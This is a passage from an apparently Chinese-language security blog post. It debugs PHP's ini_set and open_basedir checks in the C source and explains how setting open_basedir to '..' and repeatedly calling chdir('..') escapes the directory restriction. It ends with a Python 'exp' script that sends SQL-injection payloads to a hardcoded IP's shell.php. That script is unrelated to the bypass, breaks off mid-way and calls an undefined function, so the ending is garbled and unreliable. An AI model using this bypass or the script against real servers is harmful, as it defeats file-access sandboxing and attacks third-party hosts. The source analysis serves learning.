    ├── phar
    ├── posix
    ├── pspell
    ├── readline
    ├── recode
    ├── reflection
    ├── session
    ├── shmop
    ├── simplexml
    ├── skeleton
    ├── snmp
    ├── soap
    ├── sockets
    ├── spl
    ├── sqlite3
    ├── standard
    ├── sysvmsg
    ├── sysvsem
    ├── sysvshm
    ├── tidy
    ├── tokenizer
    ├── wddx
    ├── xml
    ├── xmlreader
    ├── xmlrpc
    ├── xmlwriter
    ├── xsl
    ├── zip
    └── zlib
我就不一一介绍了,太多了也啃不动，其实我觉得学习内核看那本书然后自己调试学习主要思想好了，真的要完全读懂我感觉不是很大必要。
我们之间在当前目录下搜索 `_FUNCTION(ini_set)`
然后直接跟进c源文件,下个断点开启调试
我们先看下这个函数的构成吧
    PHP_FUNCTION(ini_set)
    {
        zend_string *varname; 
        zend_string *new_value;
        char *old_value;
        if (zend_parse_parameters(ZEND_NUM_ARGS(), "SS", &varname, &new_value) == FAILURE) {
            return;
        }
        old_value = zend_ini_string(ZSTR_VAL(varname), (int)ZSTR_LEN(varname), 0);
        /* copy to return here, because alter might free it! */
        if (old_value) {
            RETVAL_STRING(old_value);
        } else {
            RETVAL_FALSE;
        }
    #define _CHECK_PATH(var, var_len, ini) php_ini_check_path(var, (int)var_len, ini, sizeof(ini))
        /* open basedir check */
        if (PG(open_basedir)) {
            if (_CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), "error_log") ||
                _CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), "java.class.path") ||
                _CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), "java.home") ||
                _CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), "mail.log") ||
                _CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), "java.library.path") ||
                _CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), "vpopmail.directory")) { /
                if (php_check_open_basedir(ZSTR_VAL(new_value))) {
                    zval_dtor(return_value);
                    RETURN_FALSE;
                }
            }
        }
        if (zend_alter_ini_entry_ex(varname, new_value, PHP_INI_USER, PHP_INI_STAGE_RUNTIME, 0) == FAILURE) {
            zval_dtor(return_value);
            RETURN_FALSE;
        }
    }
从新手角度出发(ps.作者本身就是个菜鸟)
    zend_string *varname; 
        zend_string *new_value;
      # 在zend_types.h->typedef struct _zend_string     zend_string;
    struct _zend_string {
        zend_refcounted_h gc; //变量引用计数
        zend_ulong        h;                /* hash value */
        size_t            len; //字符串长度,可以防止c语言溢出。
        char              val[1]; //字符串内容，这是个动态的变长struct
    };
所以说这里定义两个字符串变量分别为: `varname` and `new_value`
    if (zend_parse_parameters(ZEND_NUM_ARGS(), "SS", &varname, &new_value) == FAILURE) {
            return;
        }
    //zend_parse_parameters 这个方法顾名思义就是拿来解析函数参数的，SS代表是两个字符串
    //debug进去看下值
其实就是我们代码里面的`ini_set('open_basedir', '/tmp');`的参数啦。
继续
    char *old_value;
    .....
    old_value = zend_ini_string(ZSTR_VAL(varname), (int)ZSTR_LEN(varname), 0);
    //ZSTR_开头的宏方法是zend_string结构专属方法 取值 取长度
    // zend_ini_string就是加载ini配置中的open_basedir这个原本的值啦
我一开始没设置，所以是空。
    #define _CHECK_PATH(var, var_len, ini) php_ini_check_path(var, (int)var_len, ini, sizeof(ini))
    // 为了简化下代码用了下define 继续跟进，省略一些无关的细节
里面有个关键函数决定是否能够进行`ini_set` 也就是绕过这个保护。
    //前面的都不是open_basedir,所以直接跳到这里了
    if (zend_alter_ini_entry_ex(varname, new_value, PHP_INI_USER, PHP_INI_STAGE_RUNTIME, 0) == FAILURE) {
            zval_dtor(return_value);
            RETURN_FALSE;
        }
我们简单跟进这个函数`zend_alter_ini_entry_ex`，一直F8直到返回-1,就知道是哪个关键函数了，打个断点，再次跟进就行了。
跟进
    ini_entry->on_modify(ini_entry, duplicate, ini_entry->mh_arg1, ini_entry->mh_arg2, ini_entry->mh_arg3, stage) == SUCCESS)
按上面的方法我们定位最终失败的函数是:
(php`OnUpdateBaseDir at fopen_wrappers.c:81)
第一次成功:
第二次失败是:
我们果断跟进查看下,`ini_entry->on_modify`这个返回值怎么获取的。
可以看到在这里就进行了返回`failure`
下断点跟进`php_check_open_basedir_ex`
如果这里能通过话，就会`return 0`这样`ini_set`设置为`..`就会成功
我们跟进看下怎么样才能成功。
这里我们就得好好分析下了，把代码贴出来
跟进`php_check_specific_open_basedir`看下怎么处理的。
可以看到这里，做了一些比较简单分析下:
首先我们要明确的是我们一开始代码设置了正确的`open_basedir`是`\tmp`
    if (strncmp(resolved_basedir, resolved_name, resolved_basedir_len) == 0) {
    #endif //这里就是比较 我们设置的 ini_set('open_basedir', '..'); 和  resolved_basedir是否一致
                if (resolved_name_len > resolved_basedir_len &&
                    resolved_name[resolved_basedir_len - 1] != PHP_DIR_SEPARATOR) {
                    return -1;
                } else {
                    /* File is in the right directory */
                    return 0;
                }
            }
很明显就不一致。
    if (resolved_basedir_len == (resolved_name_len + 1) && resolved_basedir[resolved_basedir_len - 1] == PHP_DIR_SEPARATOR) {
    #if defined(PHP_WIN32) || defined(NETWARE)
                    if (strncasecmp(resolved_basedir, resolved_name, resolved_name_len) == 0) {
    #else
                    if (strncmp(resolved_basedir, resolved_name, resolved_name_len) == 0) {
    #endif
                        return 0;
                    }
                }
                return -1;
            }
这个代码的意思其实就是注释啦`/* /openbasedir/ and /openbasedir are the same directory */`
虽然长度不一样，但是他们是等价的。 我们可以回溯下这些比较的变量是怎么来的了。
简单跟进下，可以参考下@一叶飘零师傅的，我这里直接简写最后的结果。
这段代码能起到一个利用在当前script脚本目录下设置一个`ini_set('open_basedir', '..');`
然后可以使得`open_basedir`通过`chdir('..')`向上跳的功能。
通俗的理解就是:
比如我们的脚本文件路径:
`"/Users/xq17/Desktop/个人学习/php扩展学习/debugphp/php7/bin/"`
然后`ini_set('open_basedir', '..');`的`..`参考的是我们脚本的相对路径,然后校对原本`open_basedir`
值来比较的。
当我们`chdir('..')`，也就是把我们脚本文件向上跳一层的时候，那么根据相对路径，
`open_basedir`本来的值也要向上跳一层,多次chdir之后就可以跳到根目录下了。
(原理就是chdir他会自己进行一次`php_check_open_basedir_ex`,修改了对应的指针值，导致bypass)
下面通过解释下代码来说明下成因:
为了方便调试这个原因我们修改成如下代码再重新进行debug
可以看到这里比较通过了,重点就是path = `..` `ini_set('open_basedir', '..');`
* * *
上面是不是不知道到底在说啥？。。。。。。其实我自己也懵b,上面那条就是懵b分割线。
下面这条谈谈自己新的理解
* * *
我们首先还是得从基本出发,回到`open_basedir`的作用上来。
>
> Open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中
那么到底怎么限制的呢,我们使用`chdir('..')`能不能跳出`open_basedir`呢。
跟进`chdir`的函数定义，我们看到解析完参数值之后，就进行了`open_basedir`的检查
所以能不能绕过目录限制，其实就是过掉`php_check_open_basedir`
我们可以选择跟进查看下这个函数
这里注意下拼接取当前脚本的路径:
后面这里就是比较了
    strncmp(resolved_basedir, resolved_name, resolved_basedir_len) == 0
    //这里把resolved_basedir 和 resolved_name(拼接结果)进行了比较
那么`resolved_basedir`怎么来的呢
可以看到将`local_oepn_basedir`按照上面根据相对路径或者绝对路径进行了划分。相对的话就拼接了。
所以payload的重点就是通过新建一个子目录，然后设置当前脚本的`open_basedir`为`..`这样拼接的时候就会跳一级来比较了。
## 完整的exp脚本
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    # type: UnderScoreCase
    import pyotp as pyotp
    import string
    import requests
    import urllib
    import re
    from flask import Flask
    app = Flask(__name__)
    totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)
    retry_count = 5
    timeout = 5
    debug = True
    deep_debug = False
    proxies = 'http://127.0.0.1:8080'
    s = requests.session()
    # all printable char
    fuzz_char =  string.printable
    @app.route('/sql/username=')
    def attack_sql(username):
        attack_url = 'http://136.244.114.21:8090/shell.php'
        username = urllib.unquote(username).replace(' ', '/**/')
        # username = urllib.quote(username)
        params = {
            'a' : 'login admi%s admin' % username,
            'totp' : totp.now()
        }
        if debug:
            print(params)
        r =  get(0, attack_url, params, 0)
        return r.content
        # return 'Hello World %s!' % username